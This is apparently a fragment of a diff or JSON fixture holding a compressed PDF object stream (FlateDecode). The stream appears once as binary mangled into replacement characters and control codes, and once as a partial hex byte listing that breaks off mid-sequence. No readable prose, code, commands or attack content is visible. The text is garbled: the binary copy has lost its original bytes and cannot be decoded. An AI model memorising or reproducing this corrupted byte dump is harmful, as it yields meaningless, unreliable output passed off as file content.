\ufffd\ufffdf\ufffds\ufffd\ufffd\u001c=\ufffdW`\ufffd\ufffd>[W\ufffd\ufffd\ufffd\ufffd~\ufffd\ufffd:Yf\u0017\u001f\ufffd\ufffd\ufffdO?\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdw\ufffd}\ufffd\ufffd\ufffd\ufffd?|\ufffd\u0011\ufffd_vZj\ufffd\u0007\u0007\u007f\u001ag`\ufffd\u0003\ufffd\ufffd\ufffdR\ufffdq\ufffd\ufffdK\ufffd\ufffd2O\ufffd\ufffd\ufffd\u0017\ufffdw\ufffd.{\ufffdN\ufffd\ufffdV\ufffd\ufffd\ufffd*\ufffd\ufffdI\ufffd\ufffd\u0012\u0014.\ufffd\\~\ufffde`^\u000e\ufffd\ufffd~\ufffd\ufffd_\u007f\u001d\ufffd^\u001dlb\ufffd\ufffdd\u007f\u001e \ufffd\ufffd9?:\ufffd\u001f6\ufffd\ufffdW\ufffd\ufffd\ufffd\ufffdC8?l\ufffd\ufffd\ufffd\ufffd\ufffd%\ufffd?O\u0005\ufffd\ufffd\ufffdn\u0000\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdl7\ufffd\u0015\ufffd|\u0005\ufffd\ufffdh\ufffd|\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdxt\ufffd\\\ufffdo\ufffd\ufffd\"\ufffd\ufffd\ufffd\u0018\u001e\ufffd_\ufffd\ufffdo\r\ufffd>8\ufffd+\ufffd\r.V\ufffd_z\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdl\u007f\ufffd\ufffdz\ufffd\ufffd+\ufffdj\ufffd\ufffd$;\u0005\ufffd\ufffdz\ufffd\u0007\ufffd\ufffd\ufffd\ufffd:\u000e\ufffdZ\ufffd\ufffd\ufffdcl(\u0011\ufffd\ufffd\ufffd\u001c\ufffdJy|\n\u0018w2A\ufffdt\ufffdo|s7l\ufffd\ufffd\ufffdFD\ufffd\u00055\ufffdf\\\ufffd+\ufffd\ufffd\u001f\ufffd\ufffd\ufffd}3G\ufffd\ufffd$\ufffd\ufffd)S\ufffd\ufffd\ufffd \ufffdT\ufffd\ufffdn\ufffd\ufffdO\ufffd:Mo\u0002F\ufffd<\u0013\ufffd\ufffd9I\ufffd\ufffd\u001f\ufffd\ufffd\ufffdJ\ufffd\ufffd\ufffd!_Q$\ufffdX\ufffd 5\ufffd,5\u0015\u001c\ufffdG\u0001\ufffd$\u0013\\\ufffd\ufffdUxkl\u0006(?\ufffd\u0005\ufffd}\ufffd\\\ufffdp\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdo{iX\ufffd\ufffd\ufffdJj\ufffd\u0010\ufffd=\ufffd\ufffdkj\ufffd:.\ufffdt\ufffd\ufffd\ufffdDJr\ufffd>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u000f\ufffd\ufffdu*\ufffdHT\ufffdR\ufffdq\ufffdkJ\ufffd\ufffd\ufffd@<\ufffdr\\\ufffd\ufffd\ufffdKm}\b\ufffd\ufffd\ufffd\ufffdN\u0004\ufffd>\ufffd\ufffdaH\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffdg\ufffd(]:\ufffd\ufffd'~'m\ufffdS\ufffd[\ufffdE\ufffdx\\\ufffd$'\u001ba[\u0011+\ufffd(\ufffd\ufffd\ufffd>\ufffd{Q\ufffd\ufffd\ufffd\ufffdQ|\ufffd\n\ufffd!\ufffdP\ufffd\ufffdk#d\ufffd(\ufffd\ufffd~Y\u0013j\u0018\ufffd\ufffd\u0007\ufffd\ufffdo\ufffd\ufffd6\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdh\ufffd\ufffdt6\ufffd$^\ufffd\ufffd\ufffd\u001eC\ufffdG\u0011\u007f\b\ufffd\u0016\u001e\ufffdc?\ufffdI\ufffd\ufffdchp\ufffd+\ufffd\u0019_c\ufffd\u0015\ufffd!dDx\f\ufffd0$\ufffd>\u0002yA\ufffd\u0004\ufffd\u001a\ufffd\ufffd\ufffd\ufffd!\ufffdt#\ufffd '\ufffd\ufffd\ufffd\ufffd}\ufffd\ufffd\ufffd\ufffdY\ufffdw\ufffdo\ufffd\ufffd\ufffd\t\u007f\ufffd\u000f~!7\ufffd\ufffd\u000ea8\ufffd\ufffd5\ufffdz\ufffd\"1\ufffd\ufffd\ufffdoq\u001aN\u0017\ufffd\ufffd\ufffd\ufffd2\u0014\ufffd<\ufffd\ufffd\ufffdX\u001b\ufffd\u000b\ufffdio\ufffd'Tw\ufffd\ufffd.\ufffd\ufffd\ufffdVNC\ufffd\ufffdG\ufffd`\ufffdn\ufffd\ufffd6\ufffdk\ufffd[,>\ufffd\ufffdF^\ufffd\ufffdE~\ufffd\u007f4\ufffd\ufffdZ\ufffd!\ufffd\ufffd3&\ufffd\ufffd>\ufffd\ufffda\u0017\ufffdX\ufffd\ufffd\ufffd<c\ufffd\ufffd\ufffd:\ufffd!\u007fz\ufffd:\ufffd\ufffd\ufffd,\ufffdbm\ufffdh,\n\u00154\ufffdL\ufffd\ufffdBn\u0017\ufffd\ufffdF->\ufffd\ufffd\u000b\ufffd\ufffd\ufffd\ufffd_yF[\u001f\ufffd\ufffd\ufffd\u000ey\ufffdo\u0018\ufffd\ufffd\ufffd\ufffd\u0015\ufffdr\ufffd\ufffd\ufffd\ufffdi\ufffda\ufffd!\bq\ufffd_\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd_\ufffd\ufffd\ufffd_$\u001a\ufffdw\ufffd\ufffd'|\u001b~\ufffd\ufffd>\ufffd\ufffd8\ufffde\ufffd\u007f\ufffd\ufffd\ufffd\u0017\ufffd\ufffd\ufffd\u0007\ufffd\u001bF\ufffd?\ufffdO\u0014=\ufffd\ufffdN\ufffd|\ufffd\ufffd\ufffd=\ufffd\ufffd\ufffd\ufffd\u0004}\ufffd]8o\ufffd\ufffd\ufffd:\ufffdL0-(e]\ufffd+\ufffdkc?HP}\u0015v\ufffd\ufffd>\ufffd\u0017\ufffd\ufffd\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd\u001f\ufffd\ufffd\u0002\ufffdE\ufffdo]y\ufffd\ufffd7A\ufffd\ufffd\ufffd\u007f,O\ufffd\ufffd\ufffdOY'~\ufffd\ufffdD\u0017\ufffd\ufffd/\ufffd\ufffd\ufffd\ufffd\ufffd\u0006\ufffd\ufffd\ufffdc?\ufffd\ufffd\ufffd!\u007f\ufffd\ufffd\ufffd\ufffd\ufffd.\ufffd\u0012\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u001f-~\ufffd\ufffd\ufffdW\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\ufffd\u000b\ufffd\ufffd\ufffd\ufffdO9\ufffd}\ufffd\b\ufffdB\ufffd\u0006?V\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u000fy\ufffd\ufffd\u0003\ufffdSb\ufffdFN\ufffd\u0002\ufffd\ufffd\t\ufffd\ufffdn\ufffd\u001f\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd<t[\ufffd ~8\ufffd\ufffdg\ufffdi\ufffd\ufffd\ufffd\ufffd\ufffd9~M\ufffd\ufffd\ufffd7\ufffd\ufffd9>\u001eN\ufffd\ufffd>\ufffd\ufffd\ufffd?\ufffdm\u007f\ufffd\u0000T\ufffd\\\u001f\ufffd\ufffdO\ufffd\ufffd?\ufffd\ufffd\ufffdE\ufffd?\n\ufffd\u001b\ufffd\ufffdSat\ufffd\ufffd\ufffd\ufffd?\ufffd\ufffd{\u0001\ufffd\ufffdO\ufffdB\ufffd\ufffd\ufffd\ufffd'\ufffd\ufffd\u0019\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd/\ufffd\ufffd}\ufffd\ufffd\ufffd\ufffd\ufffdC\ufffd\ufffd;\ufffdB\ufffd\ufffd\ufffd/\ufffdI\ufffd\u000f\ufffd-\ufffd\ufffdl\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u000f\ufffd\ufffd\ufffd3~9\u000e\ufffd\ufffd\ufffd\ufffd\ufffd~\ufffd\u0014{\ufffd\u001c\ufffd\u0005\ufffd\ufffd\ufffd\u001f\ufffd'\ufffd\ufffd:|\ufffd\ufffd\ufffdV\ufffd\u001fv\ufffd\ufffd\u0001\ufffd\ufffd\rz\ufffd\ufffd\u001e\u007f\ufffd/\u001e\ufffd[~B~^\ufffd\ufffd\ufffd\\\ufffd\ufffdEM\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdm7\ufffd\ufffdK{2\ufffd\ufffd}\ufffd\ufffd\ufffd\u0002CB\ufffd5\ufffd\u000e\ufffdi\ufffd*\ufffd\ufffd\ufffd4P\ufffd\ufffd\ufffdH\u000b\ufffd\ufffd\ufffdS\ufffd\ufffd!\ufffdY\u0003\ufffd\ufffd\ufffd\ufffdW\ufffd\ufffd\ufffd\ufffd\tf\ufffd\ufffd\ufffd\ufffd\ufffd45\ufffd\ufffd\ufffd\ufffd&6\ufffdU \ufffdu:\ufffd\u0005g\u001c\ufffd\ufffd)\ufffd76\ufffd~\ufffd6\u001eB=\ufffd\u001c\ufffd\ufffd\ufffd\ufffd\ufffdI\u000b\ufffd\u0005\ufffdj\u0012\ufffd3\ufffdS\u001b7\ufffd\ufffd\ufffdvYP)\ufffd\u0014r\u0013:h\ufffd:\ufffd^\ufffd\ufffd\ufffdo\ufffdc\ufffd\ufffdK\ufffd\ufffd\ufffd6\ufffdOq\ufffdx&5\ufffdJ7\ufffd5N\ufffd\u001e?\ufffdf\ufffdO\ufffd\ufffdg\ufffd}\f\ufffd8 \ufffd\ufffd\u0003cz\ufffd\ufffd}!p\ufffd\u0018\ufffd\ufffd}kO\t2\ufffd\ufffd^\ufffd\ufffd\r\ufffd\ufffdB\ufffd:\u0006\u001c\ufffd\ufffd\ufffd]`\u00107u(K\ufffd\ufffd\ufffd\ufffdx'1\ufffd*c\ufffd|\ufffdo\ufffd\u001cjn\ufffdmP\ufffd\ufffdw\ufffd\ufffd\ufffd?\ufffd;\ufffd\ufffd\ufffd\ufffd#\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdt\ufffd\ufffd\ufffd_L\ufffd\ufffd\u0001c\ufffd\ufffd\u0007n\ufffd\ufffd6\ufffdKL\ufffde\ufffdu!\ufffd\ufffd\u0012\u0014\ufffd7e31\ufffd\ufffd#\ufffd\ufffd\ufffd\ufffd\u007f&=\ufffdJ\u0004\ufffd\ufffd_\ufffd\ufffd\ufffdo\ufffd!\ufffd}\ufffd\ufffd\ufffd\ufffd\u0004\ufffd\ufffd\r\ufffd\"\ufffd\ufffd\ufffda>T\ufffd\u0012\ufffd?xe\ufffd\ufffd\ufffd\ufffd,\"U\ufffd\u007f4\ufffd{\ufffd\ufffd\ufffd\ufffd\ufffd\u0017\ufffdE\u001a\ufffdX\ufffd\ufffd\ufffd\u0012\ufffdo'i\ufffd-\ufffd\ufffd:p&#\ufffd\ufffdy\u001f+Y8\ufffdi\ufffd-T\ufffd\ufffd\ufffd\ufffd\u001cs\u000f\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdA1Ix\ufffd?\u0000\ufffd\ufffd\ufffd>}\ufffd\ufffd\"p\ufffd;Q\ufffd6~\ufffd\ufffd+\ufffd\ufffd\ufffdE5M\ufffdCw\ufffdyLR\ufffd\ufffd\ufffd\ufffdt\ufffd\ufffdF#\ufffd\ufffd\ufffd\u001dz\u001d\ufffdw*\ufffdC\ufffd\ufffd\ufffd7\ufffdT\u0010\ufffdT\ufffd8\u0012B\ufffd\u0004\ufffdu\u001d\ufffd\ufffd\u000f\ufffd\ufffd\ufffd\ufffdn}\ufffd\ufffd\ufffdO\ufffd\ufffd#\ufffd\ufffd\ufffd\ufffdG\ufffd%\ufffd\ufffd?\ufffd\u0018\ufffd\ufffdc\ufffd\ufffd\u001b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u000f\n\ufffd\ufffd \ufffdI\ufffd'\ufffdf6\ufffdKN\ufffd\ufffd;;\u0004\ufffdwK\ufffd\ufffd\ufffd\ufffd\u000e\ufffd\ufffdE|\ufffd\ufffdFQm\u0002?\ufffd)RQ2\ufffd&\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdj\u0003\ufffd#n\ufffd\u0007\ufffd\ufffd\ufffd\u0015\ufffdV\ufffd>\\\ufffd^7\ufffdW\ufffd\ufffd\ufffd\ufffd9\ufffd\u0004\ufffd;\u0018\ufffd\ufffd4\ufffd\ufffdy\ufffd}i\u001f\ufffd\ufffd7\ufffd\ufffd\ufffd\ufffd\u007f\u00136\ufffd\ufffdQ<\ufffd\ufffd\ufffd\ufffdg}\ufffd\ufffdq\u001e,\u001dw\u0006\ufffdo\ufffdc\ufffdg%\ufffd\ufffd5\ufffd\u00070\ufffd\u001b\ufffd*\ufffd\ufffdf_v\ufffd\ufffdO\r\ufffd\ufffd.\ufffd\ufffd,9\ufffd\ufffd\ufffd\ufffd0\ufffdf\ufffd<\ufffd\ufffd{\ufffd\ufffd\ufffdG2sC\ufffd\u000f\ufffd{Z-\u001d\ufffd\ufffd\ufffd\u0019\u0013\ufffdk\ufffd\ufffd\ufffd\ufffd\ufffdP\u000e\ufffd\ufffd\ufffd\ufffd{Z\u0001?xm\ufffdQ\ufffdI\ufffd\ufffd}\ufffd\ufffd\ufffd\ufffd\u0018\ufffdf\ufffd\ufffd9\u0017\u0013\ufffd\ufffd_\ufffd}\ufffd\ufffd\ufffd\f4\u0014\ufffd>\ufffdG\ufffd\u007f8\ufffdL\ufffd\ufffd\ufffdn\ufffd/H\f\u000b\ufffd?8/\ufffd9\ufffd5\u0001\ufffd>@<CiXp\ufffdp\ufffdO\u001f\ufffd>X,\ufffd\ufffd<\u0004>e\ufffdi\ufffd\ufffd\ufffd\ufffd\ufffdy\ufffd\ufffd8\u0006\ufffd\ufffd2\ufffd\ufffd\u000b5\ufffd\ufffd\ufffd\u000e\ufffd\u0013+\ufffd\ufffdwm=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdy\u007f\ufffd\ufffd[\ufffd{`\ufffdA\ufffd\ufffd\ufffd\u0013k\ufffd\u0000\ufffd\u0018\ufffdk\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdE\ufffd?\ufffd+\u0002\u001e\u001a\ufffd\u001fJ\ufffd\ufffdu\b\ufffd\ufffd`\ufffd\ufffd\ufffd\ufffd\u0005>\ufffdY\ufffd\ufffd\b.N^?o\ufffd|\u0005|\\?l\ufffdO\ufffd\ufffd!Q\ufffd \u0017\ufffd\ufffd\ufffdA?z\ufffd\ufffd\ufffd\u0002\ufffd\ufffd\ufffdG\r\ufffd\ufffd\ufffd\ufffdG\ufffd\ufffd+\ufffdKa\ufffd&N\ufffd\u000el\ufffdD\ufffd\ufffd\ufffd\ufffd\ufffd\r+\ufffd\ufffd\ufffd|#D\ufffdR]\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd{\ufffd\u000f\ufffd\ufffd\ufffd\ufffd~\ufffd9\ufffd\ufffd.+\ufffd\ufffd\ufffdu3c\ufffda>\ufffd\ufffdN\ufffd\ufffd<~\ufffd\ufffd\ufffd\ufffd\u0001\ufffd\ufffd\ufffd\ufffd\ufffdX>p\ufffd/\ufffd\ufffd?\u0006\ufffdzi\ufffd\ufffd\ufffd\u0012\u0015\ufffd\ufffd\ufffd|\ufffd\ufffdT\ufffd\ufffd\ufffdt\ufffdsZ\u001e\ufffd\ufffd\ufffd\nx\ufffdX\ufffd\ufffd\ufffdM<\ufffd\u001f\ufffd\ufffdj#\ufffd\u000f\ufffd3\ufffd!\ufffd\ufffd>L8\ufffd\ufffd\ufffd]\u007fH\ufffd\ufffd\ufffd\ufffdZP\ufffd\ufffdVj\ufffd\ufffd\ufffd6^\ufffdD\ufffdW|(\ufffd\ufffd\ufffd\ufffdS7\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIb\ufffd\ufffdf\ufffd<XO\ufffd\ufffd9\ufffd0cv\ufffdPUj\ufffd\ufffd\ufffdd|l\ufffd?){H\ufffd\ufffd\ufffd\ufffd\ufffdy\ufffd_^\ufffd\ufffdo\ufffd]?q\r\nendstream\r\n", 
+                    "hex": "0D 0A 3C 3C 2F 46 69 6C 74 65 72 20 2F 46 6C 61 74 65 44 65 63 6F 64 65 0D 0A 2F 4C 65 6E 67 74 68 20 32 36 34 32 0D 0A 3E 3E 0D 0A 73 74 72 65 61 6D 0D 0A 78 9C A5 58 6D 73 DB B8 11 FE 7E 33 F7 1F D4 FB D0 B1 27 77 09 41 89 6A 35 77 B9 99 C8 22 28 33 26 64 82 04 40 A2 D7 CE 90 02 13 4A 04 29 5A 92 2D 59 ED FD F7 2E 5F E4 B7 B9 76 9A 69 3E 38 A1 17 FB F6 EC B3 8B 45 BE FF EE 21 D9 0E 8A EC 31 D8 6F 07 1F 07 3F 7C 9A 5E CD 6C EC CC AF DD CF 37 1E 59 DC FA 34 08 19 17 51 2C 93 74 A9 B2 2F 5F F3 D5 BA D0 65 B5 A9 EF B6 BB FD FD C3 E1 F8 78 32 90 39 1C 59 E3 BF FC 75 F2 EE C3 C7 1F 7E FE FE BB 2F F7 D5 72 BF DA 54 03 95 2D 37 2A 1B 8F 2E 56 55 7D BF BF 1C FC F3 FB EF 06 83 41 E3 71 73 BF 87 DF 34 1E 1B 85 FE 97 CB 7C 8B 7E 6C 7E 9A ED CF E1 B3 24 AB 96 20 81 9F 66 FB 73 D8 FE 1C 3D CB 57 60 C9 E8 3E 5B 57 F0 D9 FE FD 7E 9B D5 3A 59 66 17 1F FE F6 8F 4F 3F C9 E4 A7 93 F1 D3 E4 B7 77 BF 7D F8 ED E3 DF 3F 7C FD 11 BC 5F 76 5A 6A D3 07 07 7F 1A 67 60 A0 03 E5 FD AA 52 D9 71 F1 A5 4B E1 FD 32 4F B6 9F F6 17 AB 77 EF 2E 7B CD 4E C1 FC 56 85 E1 B7 2A 8C BE 49 A1 81 12 14 2E DA 5C 7E F9 65 60 5E 0E FE D5 7E 99 83 5F 7F 1D 8C 5E 1D 6C 62 BF E8 64 7F 1E 20 EB B2 39 3F 3A 9F 1F 36 E7 CD 57 E7 87 E7 F3 43 38 3F 6C 8F 8F 9B E3 CF 25 81 3F 4F 05 EE FF F1 6E 00 91 AF AA AF EF BF 6C 37 E5 15 84 7C 05 CC B8 68 C2 7C B6 BD FA D2 BB FC D3 C7 C1 78 74 F9 5C 91 6F B1 F7 22 D6 DF DF 18 1E FD 5F 86 87 6F 0D FF 3E 38 E4 2B 9D 0D 2E 56 83 5F 7A BA E9 AC FA BA CF FB 83 DB 6C 7F BF AD 7A BB F0 2B D0 6A B8 9A 24 3B 05 EE 9E 7A E3 07 8A F1 C1 D3 3A 0E 84 5A D3 E8 D3 63 6C 28 11 DA DA F6 1C B5 4A 79 7C 0A 18 77 32 41 F6 74 CD 6F 7C 73 37 6C CE A7 82 46 44 D4 05 35 8F 66 5C EA 2B CF B1 1F 93 B9 CC 7D 33 47 A0 EF 24 C2 9D 29 53 F1 AC D8 20 8E 54 E1 99 6E B4 98 4F B5 3A 4D 6F 02 46 AE 3C 13 CF D3 39 49 98 81 1F E2 D2 BA 4A B0 DE AB 21 5F 51 24 91 58 93 20 35 F4 2C 35 15 1C B0 47 01 93 24 13 5C A4 8E 55 78 6B 6C 06 28 3F 85 05 A9 7D A1 5C DF 70 9F FC F9 91 EB B3 E7 6F 7B 69 58 B3 84 E1 4A 6A FB 10 80 3D BF E2 6B 6A C8 3A 2E C8 74 C1 F4 9C 44 4A 72 A3 3E 85 8E B5 F0 B8 BE 0F D7 D3 75 2A 8E 48 54 BA 52 C6 71 E6 6B 4A D2 F2 98 40 3C 85 72 5C CB 8F A4 4B 6D 7D 08 87 CB DE 9E 4E 04 BE 3E C6 A6 61 48 D3 BD F7 CB 5C A6 D1 B2 C5 67 C1 28 5D 3A A8 E0 27 7E 27 6D B5 53 A5 5B FB 45 9E 78 5C EE 24 27 1B 61 5B 11 2B F2 28 AD A6 E3 3E 9F 7B 51 E6 EB 84 B9 51 7C 9A 0A C2 21 9F 50 83 BF 6B 23 64 8A 28 A4 C7 7E 59 13 6A 18 8D FD 07 D9 F8 6F F3 BF 36 99 A6 9F 95 C9 EF 68 99 BB 74 36 AD 24 5E A2 D4 F1 1E 43 B0 47 11 7F 08 84 16 1E C7 63 3F AA 49 C6 E3 63 68 70 D7 2B AC 19 5F 63 92 15 F6 21 64 44 78 0C E1 30 24 B7 3E 02 79 41 A7 04 E3 1A E4 B7 94 E9 21 8B 74 23 E7 20 27 AD DC E0 9F 7D ED B6 FA D4 59 C2 77 AB 6F A7 B6 A4 09 7F A3 0F 7E 21 37 90 8F 0E 61 38 ED F4 35 AD 7A F9 22 31 F8 B8 B3 6F 71 1A 4E 17 8D BC C9 87 32 14 82 3C E0 B6 B6 58 1B BF 0B FE 69 6F 9F 27 54 77 FA DC 2E 8E 8C 93 56 4E 43 DA E7 47 B7 60 AF 6E E3 C3 36 F8 6B FC 5B 2C 3E 81 BF 46 5E D5 E4 45 7E BD 7F 34 86 FC 5A FF 21 A3 C4 33 26 B3 D6 3E AE E7 61 17 DF 58 9C FD 83 3C 63 A8 C7 CF 3A CB 21 7F 7A CB 3A FC B0 F7 2C BF 62 6D FE 68 2C 0A 15 34 FA 4C EC B9 42 6E 17 9F 8D 46 2D 3E DC BD 0B A2 FA B6 F7 5F 79 46 5B 1F EA E1 DA 0E 79 87 6F 18 A9 A0 AF CF 15 85 72 B5 F8 F0 DA 69 F1 61 C6 21 08 71 A7 5F D5 82 9E E3 E7 D2 E9 F3 B7 5F C7 DF DA 5F 24 1A EC 77 F9 E3 27 7C 1B 7E D8 AD 3E E1 CC 38 86 65 8B 7F E3 BF C3 17 B8 DD E3 07 F1 1B 46 8B 3F D4 4F 14 3D FE 9A 4E E1 7C D8 D5 DF 3D DB B7 E5 89 04 7D FD 5D 38 6F F5 F8 CC 3A FE 4C 30 2D 28 65 5D FD 2B E0 6B 63 3F 48 50 7D 15 76 F5 DF 3E E1 17 D5 D3 AC 40 9D BC F4 8C 8E 1F 98 F3 02 E6 45 8B 6F 5D 79 B8 C3 37 41 EC B1 CF 7F 2C 4F EE A2 AD 4F 59 27 7E CF 9F 44 17 A8 E7 2F F0 D4 A5 BD FE 06 EA D2 E3 63 3F 9E F1 F7 21 7F BF D3 AF FA FA 2E 92 12 F8 DF D6 D7 BA E3 D0 1F 2D 7E A2 A6 90 57 D8 C9 F7 A3 9E DF CC 3F F3 0B E6 8A D7 E1 4F 39 93 7D FE 08 B3 42 D1 06 3F 56 EE A5 87 B0 F5 8A BF C0 0F 79 EA EA 03 F9 53 62 A3 46 4E 93 02 F7 FD 09 F8 85 6E AB 1F 22 BA A1 C5 8B F8 DA FE B6 B6 3C 74 5B FC 20 7E 38 D7 D6 67 91 69 C0 C7 E8 E4 E1 39 7E 4D A9 D7 F5 37 D4 EF 39 3E 1E 4E 83 B6 3E E5 BE E9 3F EB 6D 7F F9 00 54 F6 5C 1F AB EB 4F BB F7 3F C1 C0 CF 45 CF 3F 0A E7 1B FF 80 53 61 74 FC 98 D8 E0 3F E8 FB 7B 01 F8 D7 4F FA 42 F7 FD D3 CF 27 B1 97 19 EE F8 9F A0 E2 D4 CF 2F 9B 81 7D D6 E1 BB EE F9 43 DB FC 3B FE 42 FE BC EF 2F CE 49 A7 0F FD 2D E7 AC 6C EB B3 A5 91 EA E6 0F E0 AF 8C 33 7E 39 0E AB AE FF D9 B9 7E E1 14 7B 9D 1C F8 05 F3 A9 D3 1F C7 27 B2 C8 3A 7C B7 D0 BF 56 C7 1F 76 EA F9 01 F3 C5 0D 7A FE 90 1E 7F D0 2F 1E D9 5B 7E 42 7E 5E CF 9F AC 5C F6 FC 45 4D FD CE FC AD CE FE A9 6D 37 F9 BB 4B 7B 32 F4 EC 7D CE 91 AE 02 43 42 FE 35 96 0E D6 69 81 2A 86 FD 83 34 50 98 CE 94 48 0B CB 91 9C 53 89 A6 21 F0 59 03 CE C3 B0 AB 57 D3 DF B7 DE 09 66 B0 A9 A7 D2 A0 34 35 EA 99 C0 F5 26 36 F5 55 20 F8 75 3A E7 05 67 1C EC 91 29 DC 37 36 83 7E A0 36 1E 42 3D 9B 1C AB C4 A8 8B 94 49 0B F6 05 83 6A 12 A7 33 AA 53 1B 37 E7 AF 88 76 59 50 29 9D 14 72 13 3A 68 94 3A EE 5E CE A6 B9 6F E0 63 C0 A8 4B DE F8 E3 36 BA 4F 71 9D 78 26 35 E2 4A 37 F7 35 4E C0 1E 3F B1 66 DE 4F 95 AD 67 89 7D 0C B8 38 20 C9 F2 03 63 7A B6 84 7D 21 70 D4 18 F8 BA 7D 6B 4F 09 32 A7 A5 5E F9 86 0D F1 E5 42 F1 3A 06 1C A5 B0 DD 5D 60 10 37 75 28 4B 86 EA 96 DB 78 27 31 DD 2A 63 C2 7C A1 6F F8 1C 6A 6E AA 6D 50 9E EF 77 D5 E6 F3 3F EE 3B B7 CD BE E3 23 BC EB F7 AB C2 9B E9 9D 74 F6 A4 C5 5F 4C 9E EB 01 63 B6 AD 07 6E F1 9C 36 FC 4B 4C E5 65 CC 75 21 BF 9D 12 14 EE 37 65 33 31 F9 EC 23 95 A8 B2 D9 7F 26 3D DE 4A 04 86 B5 5F F0 EE FE 6F EA 21 A1 7D D2 93 BB F2 04 A9 98 0D F1 22 FF 91 AF 61 3E 54 A4 12 9A 3F 78 65 B3 B7 A8 9B 2C 22 55 BF 7F 34 F5 7B DE FF F0 F2 91 17 FB 45 1A EA 58 E0 D7 FB 12 EC 6F 27 69 F2 2D 8F F4 3A 70 26 23 C1 E9 79 1F 2B 59 38 BD 69 F7 2D 54 DF F3 8A C3 1C 73 0F F1 FA BA D9 8F F6 41 31 49 78 99 3F 00 DE BB BE 3E 7D FC F9 22 70 DC 3B 51 E8 36 7E C1 F3 2B D8 BF EE 45 35 4D 84 43 77 B1 79 4C 52 87 DC 87 D5 74 E5 C1 46 23 ED A5 C5 1D 7A 1D C0 77 2A C8 43 80 9E FC 37 F8 54 10 DF 54 9A 38 12 42 DD 04 B6 75 1D C3 BC 0F 98 B6 89 A3 6E 7D F3 D0 EE 4F CF FB 23 EE CE A3 EB 47 89 25 F8 DB 3F C0 18 EB F8 63 BE 90 1B FA BA DF CF E0 CE CD 0F 0A D3 BB 20 E4 49 C7 27 E2 66 36 BA 4B 4E FC 96 3B 3B 04 F3 77 4B D8 84 BD F9 0E 83 F0 45 7C FD FE 46 51 6D 02 3F A7 29 52 51 32 9F 26 DC D0 E3 80 B5 FD 6A 03 9F 23 6E E6 07 A1 95 9B 15 DA 56 CD 3E 5C C2 5E 37 D4 57 A2 84 FD D9 39 CA 04 FA 3B 18 EA 93 34 F6 F1 79 DF 7D 69 1F F6 E3 37 F1 E2 C7 A6 7F 13 36 99 FD 51 3C C1 EC DC FF 67 7D D8 9F 71 1E 2C 1D 77 06 F5 6F F7 63 D8 67 25 EC E7 35 DC 07 30 9F 1B BE 2A 99 B0 66 5F 76 B9 98 4F 0D EE D4 2E E1 F5 2C 39 BD AC 87 A4 30 9F 66 DC 3C EE E1 7B 93 E9 EB 47 32 73 43 C0 0F F6 7B 5A 2D 1D DE CC AF 19 13 C7 6B B1 C6 B0 EB F3 50 0E D5 8B FE A3 7B 5A 01 3F 78 6D C7 51 BD 49 8A F6 7D D2 EC D7 BB 18 E6 66 E2 90 39 17 13 B7 BB 5F DA 7D B9 BB 9F 0C 34 14 91 3E CF 47 B0 7F 38 C5 4C ED 96 A8 6E FA 2F 48 0C 0B EE 3F 38 2F DC 39 F0 35 01 BE 3E 40 3C 43 69 58 70 9F 70 C8 4F 1F E0 3E 58 2C 8B C9 3C 04 3E 65 EB 69 F5 F4 FD D4 8F 79 90 9A 38 06 B9 97 32 CB 8C 0B 35 82 F7 CC 0E DE 13 2B CF A8 77 6D 3D 91 FD B8 88 C8 AA 79 7F C0 FC 5B C0 7B 60 9E 41 FD C0 9F 13 6B E5 00 BE 18 E6 6B 92 86 F9 83 8C FA F7 45 8F 3F DC 2B 02 1E 1A B5 1F 4A F8 D6 75 08 FD AC 60 BF 87 FE BD 05 3E CE 59 E8 9E 08 2E 4E 5E 3F 6F CE 7C 05 7C 5C 3F 6C E6 4F F3 FE 21 51 EA 20 17 E6 D5 98 41 3F 7A 9A C0 FB 02 E6 85 B3 47 0D DF 83 A2 ED 47 DD CD 2B B5 4B 61 9E 26 4E BE 0E 6C 8C 44 B1 B4 92 E2 B8 0D 2B B9 A2 C3 7C 23 44 81 52 5D C7 AC A8 A5 B7 D6 E8 F5 7B EC 0F FA 89 FD B7 7E 82 39 C4 E4 2E 2B F1 BD 84 75 33 63 FF 61 3E DB C8 4E CC F3 3C 7E C3 CF 99 BB 01 FC A0 FE D0 EF 58 3E 70 94 2F 96 C2 3F 06 9A 7A 69 94 EF E2 12 15 9E 83 BB 7C 9B F7 54 D1 CD D7 74 86 73 5A 1E C7 B1 B0 0A 78 DE 58 DD FB F1 4D 3C D5 1F F8 C3 6A 23 A0 0F 97 33 C2 21 AE F6 3E 4C 38 AD 89 A3 5D 7F 48 DE C8 BB F7 5A 50 90 88 56 6A ED 9F F8 36 5E BB 44 F1 57 7C 28 E0 FE C1 A9 53 37 F3 ED E1 8D FD FE BD 49 62 CF B6 66 D2 3C 58 4F EF CB 39 97 30 63 76 DC 50 55 6A EC D9 F2 64 7C 6C FF 3F 29 7B 48 F4 C5 D3 FB BE 79 EF 5F 